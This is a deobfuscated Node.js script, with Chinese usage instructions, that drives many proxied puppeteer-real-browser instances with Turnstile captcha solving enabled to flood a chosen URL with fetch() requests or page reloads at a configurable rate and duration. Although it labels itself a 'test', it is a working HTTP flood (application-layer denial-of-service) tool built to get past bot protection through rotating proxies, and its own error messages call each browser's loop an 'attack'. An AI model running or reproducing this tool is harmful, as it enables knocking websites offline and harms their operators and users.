//Wed Jul 30 2025 02:42:53 GMT+0000 (Coordinated Universal Time)
//Base:<url id="cv1cref6o68qmpt26ol0" type="url" status="parsed" title="GitHub - echo094/decode-js: JS混淆代码的AST分析工具 AST analysis tool for obfuscated JS code" wc="2165">https://github.com/echo094/decode-js</url>
//Modify:<url id="cv1cref6o68qmpt26olg" type="url" status="parsed" title="GitHub - smallfawn/decode_action: 世界上本来不存在加密，加密的人多了，也便成就了解密" wc="741">https://github.com/smallfawn/decode_action</url>
const {
    connect
  } = require("puppeteer-real-browser"),
  fs = require("fs"),
  readProxies = _0x1220a3 => {
    try {
      const _0x4e999b = fs.readFileSync(_0x1220a3, "utf-8").split("\n").map(_0x2ced57 => _0x2ced57.trim()).filter(_0x5f3017 => _0x5f3017 !== "").map(_0x5064ec => ({
        "proxy": _0x5064ec
      }));
      console.log("[+] Loaded " + _0x4e999b.length + " proxies");
      return _0x4e999b;
    } catch (_0x3ee188) {
      console.error("[-] Failed to read proxy file: " + _0x3ee188.message);
      return [];
    }
  },
  launchBrowserWithProxy = async (_0x12b5e5, _0x31de5d, _0x22a9db = 30000) => {
    const {
      proxy: _0x31bd9f
    } = _0x31de5d;
    try {
      const [_0x200500, _0x46f6a3] = _0x31bd9f.split(":");
      if (!_0x200500 || !_0x46f6a3) throw new Error("Invalid proxy format, expected host:port");
      const _0x15c616 = Date.now(),
        {
          browser: _0x334c92,
          page: _0x3b4853
        } = await Promise.race([connect({
          "headless": false,
          "args": ["--no-sandbox", "--disable-setuid-sandbox"],
          "customConfig": {},
          "turnstile": true,
          "connectOption": {},
          "disableXvfb": false,
          "ignoreAllFlags": false,
          "proxy": {
            "host": _0x200500,
            "port": _0x46f6a3.toString()
          }
        }), new Promise((_0x177711, _0x4215f2) => setTimeout(() => _0x4215f2(new Error("Browser launch timeout")), _0x22a9db))]);
      await Promise.race([_0x3b4853.goto(_0x12b5e5, {
        "waitUntil": "domcontentloaded"
      }), new Promise((_0x425bd3, _0x34d70a) => setTimeout(() => _0x34d70a(new Error("Page load timeout")), _0x22a9db))]);
      const _0x3c4591 = await _0x3b4853.title();
      console.log("[+] Browser launched, proxy: " + _0x31bd9f + ", time: " + (Date.now() - _0x15c616) / 1000 + "s, title: " + _0x3c4591);
      return {
        "browser": _0x334c92,
        "page": _0x3b4853,
        "startTime": _0x15c616
      };
    } catch (_0x11f897) {
      console.log("[-] Proxy " + _0x31bd9f + " failed: " + _0x11f897.message);
      return null;
    }
  },
  performRequests = async (_0x4e4d10, _0xd296d3, _0x513092, _0x5401c1, _0x1c2b65, _0x593dfd, _0x521219, _0x2ca245, _0x185408) => {
    const _0x42ac5f = Date.now(),
      _0x12b101 = 1000 / _0x513092;
    while (Date.now() - _0x42ac5f < _0x5401c1 * 1000 && !_0x185408.stop) {
      try {
        {
          if (_0x2ca245) {
            const _0x362778 = await _0x4e4d10.evaluate(async _0x53fe25 => {
              const _0x452e2a = await fetch(_0x53fe25, {
                "method": "GET"
              });
              return {
                "status": _0x452e2a.status,
                "ok": _0x452e2a.ok
              };
            }, _0xd296d3);
            _0x593dfd.totalRequests++;
            _0x521219[_0x362778.status] = (_0x521219[_0x362778.status] || 0) + 1;
          } else await _0x4e4d10.reload(), _0x593dfd.totalRequests++, _0x521219.reload = (_0x521219.reload || 0) + 1;
        }
      } catch (_0x4b5f49) {
        _0x521219.error = (_0x521219.error || 0) + 1;
      }
      await new Promise(_0x268462 => setTimeout(_0x268462, _0x12b101));
    }
  },
  startStatsLogger = (_0x50c940, _0x4fecad, _0x42a2fc, _0x2817a4 = 10000) => {
    const _0x143546 = () => {
      const _0x49d968 = Object.entries(_0x42a2fc).map(([_0x3d3f2e, _0x3e92e7]) => _0x3d3f2e + ":" + _0x3e92e7).join(",");
      console.log("[*] Stats:\n  browsers      = " + _0x50c940.successfulBrowsers + ",\n  requests      = " + _0x50c940.totalRequests + ",\n  proxies_left  = " + _0x4fecad.length + ",\n  status_codes  = " + (_0x49d968 || "none"));
    };
    return setInterval(_0x143546, _0x2817a4);
  },
  startTest = async (_0x28d711, _0x5036da, _0x30c66b, _0x2d3dfc, _0x581e4f, _0x46943e) => {
    let _0x225055 = readProxies(_0x2d3dfc);
    const _0x1e52a1 = [];
    let _0x197a86 = 0;
    const _0x433410 = {
        "totalRequests": 0,
        "successfulBrowsers": 0
      },
      _0x2b1428 = {},
      _0x46dcec = {
        "stop": false
      },
      _0x4ddb8f = startStatsLogger(_0x433410, _0x225055, _0x2b1428);
    setTimeout(async () => {
      _0x46dcec.stop = true;
      clearInterval(_0x4ddb8f);
      const _0x4e97d2 = Object.entries(_0x2b1428).map(([_0x34a73c, _0x176014]) => _0x34a73c + ":" + _0x176014).join(",");
      for (const {
        browser: _0x390fd9,
        proxy: _0x3aadae
      } of _0x1e52a1) {
        try {
          await _0x390fd9.close();
          console.log("[+] Browser closed, proxy: " + _0x3aadae);
        } catch (_0x30abbb) {
          console.error("[-] Failed to close browser, proxy: " + _0x3aadae + ", error: " + _0x30abbb.message);
        }
      }
      console.log("[+] Test completed");
      process.exit(0);
    }, _0x5036da * 1000);
    const _0x2d0823 = [],
      _0x4885ac = async () => {
        while (_0x225055.length > 0 && _0x197a86 < _0x30c66b) {
          if (_0x225055.length === 0) {
            {
              console.error("[-] Proxy pool exhausted, stopping new browser launches");
              break;
            }
          }
          const _0x3ec5b0 = Math.floor(Math.random() * _0x225055.length),
            _0x11fa06 = _0x225055[_0x3ec5b0];
          _0x225055.splice(_0x3ec5b0, 1);
          const _0x2288f9 = async () => {
            {
              const _0x1b721f = await launchBrowserWithProxy(_0x28d711, _0x11fa06);
              if (_0x1b721f) {
                _0x197a86++;
                _0x433410.successfulBrowsers++;
                const _0x228a4f = {
                  ..._0x1b721f,
                  "proxy": _0x11fa06.proxy
                };
                _0x1e52a1.push(_0x228a4f);
                performRequests(_0x228a4f.page, _0x28d711, _0x581e4f, _0x5036da, _0x1e52a1.length, _0x433410, _0x2b1428, _0x46943e, _0x46dcec).catch(_0x364fa8 => console.error("[-] Browser " + _0x1e52a1.length + " attack failed: " + _0x364fa8.message));
              }
            }
          };
          _0x2d0823.push(_0x2288f9());
          _0x2d0823.length >= _0x30c66b && (await Promise.all(_0x2d0823.splice(0, _0x30c66b)));
        }
        _0x2d0823.length > 0 && (await Promise.all(_0x2d0823));
      };
    _0x4885ac().catch(_0x2ec4ba => console.error("[-] Queue task failed: " + _0x2ec4ba.message));
  },
  printHelp = () => {
    console.log("\n使用方法：\n  node script.js <目标URL> <持续时间(秒)> <线程数> <代理文件路径> <每线程请求速率> [--js | --reload]\n\n参数说明：\n  <目标URL>          要访问或请求的目标网址，例如：https://example.com\n  <持续时间>          测试持续的时间（单位：秒）\n  <线程数>            同时运行的浏览器数量\n  <代理文件路径>      包含代理的文本文件路径（每行格式为 host:port）\n  <每线程请求速率>    每个浏览器每秒发起的请求数\n  --js               使用 JavaScript fetch() 方式请求页面（默认方式）\n  --reload           使用刷新页面（reload）方式请求\n\n示例：\n  node script.js https://example.com 300 50 proxies.txt 10 --js\n");
  },
  args = process.argv.slice(2);
(args.length < 5 || args.length > 6) && (printHelp(), process.exit(1));
const url = args[0],
  duration = parseInt(args[1]),
  threads = parseInt(args[2]),
  proxyFile = args[3],
  rate = parseInt(args[4]),
  useJs = args[5] === "--js" ? true : args[5] === "--reload" ? false : true;
(!url || isNaN(duration) || isNaN(threads) || isNaN(rate) || !proxyFile) && (printHelp(), console.error("[-] Invalid arguments"), process.exit(1));
startTest(url, duration, threads, proxyFile, rate, useJs);